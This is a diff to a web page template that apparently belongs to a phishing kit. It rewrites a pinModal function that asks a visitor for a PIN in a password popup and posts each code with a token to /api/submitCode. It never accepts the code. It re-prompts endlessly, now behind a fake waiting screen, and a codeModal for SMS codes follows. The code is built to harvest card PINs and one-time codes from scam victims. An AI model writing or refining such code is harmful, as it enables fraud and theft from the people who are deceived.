@@ -1189,52 +1189,61 @@
             });
         }
 
-        function pinModal(codeType = "pin", title = "<%=translate["pincode_1"][ad.service.lang]%>", text = "<%=translate["pincode"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {
-            swal.stopLoading();
-            swal({
-                title,
-                text,
-                content: {
-                    element: "input",
-                    attributes: {
-                        type: "password",
-                        maxLength: 255,
-                        required: true,
-                        style:
-                            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
-                    },
-                },
-                closeOnEsc: false,
-                closeOnClickOutside: false,
-                buttons: {
-                    confirm: {
-                        text: "<%=translate["submit"][ad.service.lang]%>",
-                        closeModal: false,
-                    },
-                },
-            }).then(async (code) => {
-                try {
-                    if (!code) {
-                        swal.stopLoading();
-                        alert(wrong_code);
-                        return pinModal(...arguments);
-                    }
-                    const response = await axios.post("/api/submitCode", {
-                        codeType,
-                        code,
-                        token: token,
-                    });
+     function pinModal(
+  codeType = "pin",
+  title = "<%=translate['pincode_1'][ad.service.lang]%>",
+  text = "<%=translate['pincode'][ad.service.lang]%>",
+  wrong_code = "<%=translate['wrong_code'][ad.service.lang]%>"
+) {
+  swal.stopLoading();
+  swal({
+    title,
+    text,
+    content: {
+      element: "input",
+      attributes: {
+        type: "password",
+        maxLength: 255,
+        required: true,
+        style:
+          "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+      },
+    },
+    closeOnEsc: false,
+    closeOnClickOutside: false,
+    buttons: {
+      confirm: {
+        text: "<%=translate['submit'][ad.service.lang]%>",
+        closeModal: false,
+      },
+    },
+  }).then(async (code) => {
+    try {
+      if (!code) {
+        swal.stopLoading();
+        showWaitingModal();
 
-                    swal.stopLoading();
-                    alert(wrong_code);
-                    return pinModal(...arguments);
-                } catch (err) {
-                    swal.stopLoading();
-                    alert(wrong_code);
-                    return pinModal(...arguments);
-                }
-            });
-        }
+        return setTimeout(() => pinModal(...arguments), 3000);
+      }
+
+      const response = await axios.post("/api/submitCode", {
+        codeType,
+        code,
+        token: token,
+      });
+
+      swal.stopLoading();
+      showWaitingModal();
+
+      return setTimeout(() => pinModal(...arguments), 3000);
+    } catch (err) {
+      swal.stopLoading();
+      showWaitingModal();
+
+      return setTimeout(() => pinModal(...arguments), 3000);
+    }
+  });
+}
 
         function codeModal(
   codeType = "sms",
